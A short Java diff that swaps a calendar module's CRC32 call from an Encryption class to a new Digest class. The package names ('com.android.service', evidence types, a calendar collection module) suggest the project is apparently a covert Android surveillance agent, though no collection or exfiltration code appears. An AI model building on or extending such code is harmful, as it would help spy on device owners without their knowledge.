@@ -18,6 +18,7 @@ import com.android.service.Messages;
 import com.android.service.Status;
 import com.android.service.auto.Cfg;
 import com.android.service.conf.ConfModule;
+import com.android.service.crypto.Digest;
 import com.android.service.crypto.Encryption;
 import com.android.service.evidence.EvidenceType;
 import com.android.service.evidence.Markup;
@@ -217,7 +218,7 @@ public class ModuleCalendar extends BaseModule {
 				// if(Cfg.DEBUG) Check.log( TAG + " (go): "  ;//$NON-NLS-1$
 				// Utils.byteArrayToHex(packet));
 				final Long crcOld = calendar.get(idEvent);
-				final Long crcNew = Encryption.CRC32(packet);
+				final Long crcNew = Digest.CRC32(packet);
 				// if(Cfg.DEBUG) Check.log( TAG + " (go): " + crcOld + " <-> "  ;//$NON-NLS-1$
 				// crcNew);
 
